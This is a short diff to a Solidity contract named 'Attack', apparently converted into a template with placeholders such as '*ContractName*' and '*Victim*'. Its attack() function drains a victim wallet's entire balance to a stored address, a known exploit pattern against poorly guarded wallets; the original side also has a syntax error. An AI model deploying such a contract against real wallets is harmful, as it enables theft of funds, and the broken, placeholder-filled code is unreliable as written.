@@ -1,11 +1,14 @@
-pragma solidity ^0.6.10;
+// SPDX-License-Identifier: MIT
+*Version*
 contract Attack {
-    address payable public owner;
-    Wallet wallet;
-    constructor (Wallet wallet) public {
-        wallet = Wallet_wallet);
-        owner = msg.sender;
+    address payable public *Victim*;
+    *ContractName* victim_wallet;
+
+    constructor (*ContractName* _wallet) public {
+        victim_wallet = *ContractName*(_wallet);
+        *Victim* = msg.sender;
+    }
     function attack() public {
-        wallet.transfer(owner, address (wallet).balance);
+        victim_wallet.transfer(*Victim*, address(victim_wallet).balance);
 	}
 }
